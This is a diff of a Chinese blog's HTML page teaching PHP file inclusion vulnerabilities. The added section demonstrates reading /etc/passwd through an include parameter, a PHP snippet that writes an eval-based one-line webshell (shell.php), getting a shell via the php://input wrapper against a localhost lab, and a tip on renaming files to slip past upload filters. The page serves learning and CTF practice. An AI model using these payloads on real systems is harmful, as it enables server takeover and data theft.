@@ -10,7 +10,7 @@
 <meta property='og:description' content="PHP代码审计中的文件包含漏洞相关知识">
 <meta property='og:url' content='https://dongyuzzz5.github.io/p/phpchat2/'>
 <meta property='og:site_name' content='冬 鱼 🐟️'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='PHP' /><meta property='article:tag' content='文件包含' /><meta property='article:tag' content='漏洞' /><meta property='article:published_time' content='2026-03-15T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2026-03-15T00:00:00&#43;00:00'/><meta property='og:image' content='https://dongyuzzz5.github.io/p/phpchat2/111.png' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='PHP' /><meta property='article:tag' content='文件包含' /><meta property='article:tag' content='漏洞' /><meta property='article:published_time' content='2026-03-17T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2026-03-17T00:00:00&#43;00:00'/><meta property='og:image' content='https://dongyuzzz5.github.io/p/phpchat2/111.png' />
 <meta name="twitter:title" content="PHP代码审计 --- 文件包含漏洞">
 <meta name="twitter:description" content="PHP代码审计中的文件包含漏洞相关知识"><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://dongyuzzz5.github.io/p/phpchat2/111.png' /><div class="loading">
@@ -367,6 +367,11 @@
         <li><a href="#3漏洞利用技巧">3.漏洞利用技巧</a></li>
       </ol>
     </li>
+    <li><a href="#四-实战">四. 实战</a>
+      <ol>
+        <li><a href="#1phpcms靶场安装">1.PHPCMS靶场安装</a></li>
+      </ol>
+    </li>
   </ol>
 </nav>
         </div>
@@ -441,7 +446,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published" datetime='2026-03-15T00:00:00Z'>2026-03-15</time>
+                <time class="article-time--published" datetime='2026-03-17T00:00:00Z'>2026-03-17</time>
             </div>
         
 
@@ -839,9 +844,9 @@ include()和require()的区别是，include在包含过程中如果出现错误�
 /etc/passwd →  Linux系统的用户账号信息文件（非常敏感）</p>
 <h3 id="2漏洞的利用">2.漏洞的利用
 </h3><ul>
-<li>1.收集信息：</li>
-</ul>
-<p>思路一：下载系统内文件。<br>
+<li>
+<p>1.收集信息：<br>
+思路一：下载系统内文件。<br>
 <img src="/p/phpchat2/4.1.jpg"
 	width="798"
 	height="294"
@@ -880,26 +885,225 @@ include()和require()的区别是，include在包含过程中如果出现错误�
 		data-flex-basis="1639px"
 	
 ></p>
-<ul>
-<li>2.找WEB目录：</li>
-</ul>
-<p>在WEB服务器配置中找<br>
+</li>
+<li>
+<p>2.找WEB目录：<br>
+在WEB服务器配置中找<br>
 猜解常见路劲，如：/var/www,/home/www,/home/htdocs等<br>
 在脚本文件中，如phpinfo中的BASEPATH等</p>
-<ul>
-<li>3.获取地址列表：</li>
+</li>
+<li>
+<p>3.获取地址列表：<br>
+利用爬虫程序将网站的目录和文件全部爬取下来，整理出URL地址列表。</p>
+</li>
+<li>
+<p>4.批量下载脚本文件：<br>
+通过自动化脚本程序将URL地址列表中的脚步文件全部下载下来。</p>
+</li>
+<li>
+<p>5.分析已经下载的文件：<br>
+进行代码审计，分析源码中可能存在的各类漏洞，包括SQL注入，文件包含，命令执行，代码执行，上传漏洞等。</p>
+</li>
 </ul>
-<p>利用爬虫程序将网站的目录和文件全部爬取下来，整理出URL地址列表。</p>
-<ul>
-<li>4.批量下载脚本文件：</li>
-</ul>
-<p>通过自动化脚本程序将URL地址列表中的脚步文件全部下载下来。</p>
-<ul>
-<li>5.分析已经下载的文件：</li>
-</ul>
-<p>进行代码审计，分析源码中可能存在的各类漏洞，包括SQL注入，文件包含，命令执行，代码执行，上传漏洞等。</p>
 <h3 id="3漏洞利用技巧">3.漏洞利用技巧
-</h3>
+</h3><ul>
+<li>
+<p>1.读取敏感文件：<br>
+访问URL： <a class="link" href="http://xxx.xx/"  target="_blank" rel="noopener"
+    >http://xxx.xx/</a><span style="color: #e74c3c;">index.php?page=/etc/passwd</span><br>
+(该URL只是举个例子)<br>
+如果目标主机文件存在文件，并且有相应权限，那么就可以直接读出文件的内容。反之，就会得到一个<span style="color: #e74c3c;">类似于；open_basedir restriction in effect的警告</span>。</p>
+</li>
+<li>
+<p>2.远程包含Shell<br>
+如果目标主机allow_url_fopen选项是激活的，就可以尝试远程包含一句话木马。</p>
+</li>
+</ul>
+<p>下面举一个实战例子。<br>
+先记得启动Apache和MySQL。<br>
+<img src="/p/phpchat2/3.2.jpg"
+	width="866"
+	height="413"
+	srcset="/p/phpchat2/3.2_hu_7a45fe857f2358a2.jpg 480w, /p/phpchat2/3.2_hu_333dc4e9cb333000.jpg 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="209"
+		data-flex-basis="503px"
+	
+><br>
+我们来到刚刚主目录下的password.txt文件。<br>
+<img src="/p/phpchat2/3.1.jpg"
+	width="1204"
+	height="991"
+	srcset="/p/phpchat2/3.1_hu_8f0da9417b4bb644.jpg 480w, /p/phpchat2/3.1_hu_9206d85c5b796030.jpg 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="121"
+		data-flex-basis="291px"
+	
+><br>
+写入下面的一句话木马。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">fputs</span><span class="p">(</span><span class="nx">fopen</span><span class="p">(</span><span class="s2">&#34;shell.php&#34;</span><span class="p">,</span><span class="s2">&#34;w&#34;</span><span class="p">),</span><span class="s2">&#34;&lt;?php eval(</span><span class="se">\$</span><span class="s2">POST[xxser]);? &gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后访问URL：http://127.0.0.1/learn/learnfile.php?file=http://127.0.0.1/password.txt<br>
+刷新网页后网页显示空白页。<br>
+来到learn文件夹下，会发现多出来一个php文件。<br>
+内容是我们刚刚写入的一句话木马。<br>
+<img src="/p/phpchat2/3.3.jpg"
+	width="1474"
+	height="741"
+	srcset="/p/phpchat2/3.3_hu_fa38a3e82384714d.jpg 480w, /p/phpchat2/3.3_hu_94ed0b432976bbc8.jpg 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="198"
+		data-flex-basis="477px"
+	
+><br>
+然后就可以用菜刀或者蚁剑链接这个shell.php文件get shell了。</p>
+<p>ps:然后这里说个小技巧，在现实实战或者说打CTF时，一般会通过本地包含配合文件上传，上传的文件可能会过滤点txt文件格式，这时候我们可以把txt改成jpg或者png等其他格式，也是可以成功写入一句话木马的。</p>
+<ul>
+<li>3.使用PHP封装协议<br>
+通常情况我们访问这些文件时，会直接解析php代码，就是会直接执行。<br>
+这时候我们可以用到PHP封装协议，也就是伪协议，让页面显示出代码而不是直接执行。<br>
+下面是对于include()、include_once()的伪协议。<br>
+(require和require_once也同理)<br>
+<img src="/p/phpchat2/3.4.jpg"
+	width="1417"
+	height="474"
+	srcset="/p/phpchat2/3.4_hu_87567e09864299ed.jpg 480w, /p/phpchat2/3.4_hu_bac4acb30ef59456.jpg 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="298"
+		data-flex-basis="717px"
+	
+><br>
+下面是比较常见的的一些伪协议URL。<br>
+<img src="/p/phpchat2/3.5.jpg"
+	width="1358"
+	height="513"
+	srcset="/p/phpchat2/3.5_hu_bbfbc9971e044a07.jpg 480w, /p/phpchat2/3.5_hu_f8f99009f9912b85.jpg 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="264"
+		data-flex-basis="635px"
+	
+><br>
+我们上面已经演示过读文件操作，下面演示一下执行命令操作。<br>
+还是用刚刚的learnfile.php文件，我们打开bp抓一下包。<br>
+<img src="/p/phpchat2/3.6.jpg"
+	width="1159"
+	height="879"
+	srcset="/p/phpchat2/3.6_hu_5c915aefacae6a19.jpg 480w, /p/phpchat2/3.6_hu_c2a598d0fd3ef282.jpg 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="131"
+		data-flex-basis="316px"
+	
+><br>
+右键改变下提交方式。<br>
+<img src="/p/phpchat2/3.7.jpg"
+	width="831"
+	height="506"
+	srcset="/p/phpchat2/3.7_hu_aa728f6064ced8a.jpg 480w, /p/phpchat2/3.7_hu_32a98a76625a497b.jpg 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="164"
+		data-flex-basis="394px"
+	
+><br>
+修改一下URL并添加file参数。<br>
+<img src="/p/phpchat2/3.8.jpg"
+	width="1072"
+	height="593"
+	srcset="/p/phpchat2/3.8_hu_955cc53d5df96afa.jpg 480w, /p/phpchat2/3.8_hu_1653ec0fa07d606b.jpg 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="180"
+		data-flex-basis="433px"
+	
+><br>
+放包，回到浏览器。<br>
+<img src="/p/phpchat2/3.9.jpg"
+	width="1416"
+	height="715"
+	srcset="/p/phpchat2/3.9_hu_302d118cb4f1b6f.jpg 480w, /p/phpchat2/3.9_hu_2c03b261613f5c48.jpg 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="198"
+		data-flex-basis="475px"
+	
+><br>
+getshell成功。<br>
+不过我在做的时候出现了下面这种状况。<br>
+<img src="/p/phpchat2/3.10.jpg"
+	width="849"
+	height="732"
+	srcset="/p/phpchat2/3.10_hu_b1931ffe5c581b25.jpg 480w, /p/phpchat2/3.10_hu_7f241405eccbc3dd.jpg 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="115"
+		data-flex-basis="278px"
+	
+><br>
+初步检查了下应该是编码问题。<br>
+解决方法可以复杂我下面这段URL,然后直接修改粘贴bp里的URL。</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">/</span><span class="nx">learn</span><span class="o">/</span><span class="nx">learnfile</span><span class="o">.</span><span class="nx">php</span><span class="o">?</span><span class="nx">file</span><span class="o">=</span><span class="nx">php</span><span class="o">://</span><span class="nx">input</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/phpchat2/3.11.jpg"
+	width="775"
+	height="475"
+	srcset="/p/phpchat2/3.11_hu_f9a538039ef49e2b.jpg 480w, /p/phpchat2/3.11_hu_475872cea00c9589.jpg 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="163"
+		data-flex-basis="391px"
+	
+><br>
+编码正确的话，file=php://input这句应该会变颜色(如上图)。</p>
+<h2 id="四-实战">四. 实战
+</h2><h3 id="1phpcms靶场安装">1.PHPCMS靶场安装
+</h3><p>具体安装教程可以看我的另一篇文章：<a class="link" href="https://dongyuzzz5.github.io/p/bachang/?t=1773765534838"  target="_blank" rel="noopener"
+    >靶场安装教程</a></p>
+
 </section>
 
 
@@ -1101,7 +1305,7 @@ include()和require()的区别是，include在包含过程中如果出现错误�
 
 
 
-<p>发布了 13 篇文章 | 共 47963 字</p>
+<p>发布了 13 篇文章 | 共 49315 字</p>
     </section>
     
    
